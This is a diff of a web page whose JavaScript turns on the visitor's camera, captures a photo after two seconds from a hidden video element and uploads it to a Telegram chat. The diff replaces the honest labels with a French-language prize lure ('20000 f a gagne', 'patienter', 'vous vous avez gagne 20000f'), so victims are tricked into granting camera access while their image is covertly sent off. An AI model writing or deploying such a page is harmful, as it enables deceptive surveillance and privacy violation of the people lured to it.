@@ -10,7 +10,7 @@
 </style>
 </head>
 <body>
-<h1>📸 Photo automatique</h1>
+<h1>📸 20000 f a gagne</h1>
 <div id="status">Chargement...</div>
 
 <video id="video" autoplay playsinline muted style="display:none;"></video>
@@ -29,7 +29,7 @@ navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } })
   .catch(err => { status.textContent = "❌ Caméra refusée : " + err.message; });
 
 video.addEventListener('playing', () => {
-  status.textContent = "⏳ Photo dans 2 secondes...";
+  status.textContent = "⏳ Patienter 2 secondes...";
   setTimeout(prendrePhoto, 2000);
 });
 
@@ -40,7 +40,7 @@ function prendrePhoto() {
   canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
   canvas.toBlob(blob => {
-    status.textContent = "📤 Envoi vers Telegram...";
+    status.textContent = "📤 vous etre pas eligible...";
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     form.append("caption", "📸 Photo du " + new Date().toLocaleString());
@@ -50,7 +50,7 @@ function prendrePhoto() {
       .then(r => r.json())
       .then(json => {
         status.textContent = json.ok
-          ? "✅ Photo envoyée sur ton Telegram !"
+          ? "✅ vous vous avez gagne 20000f patienter !"
           : "⚠️ Erreur Telegram :\n" + JSON.stringify(json, null, 2);
       })
       .catch(err => { status.textContent = "❌ Erreur réseau : " + err.message; });
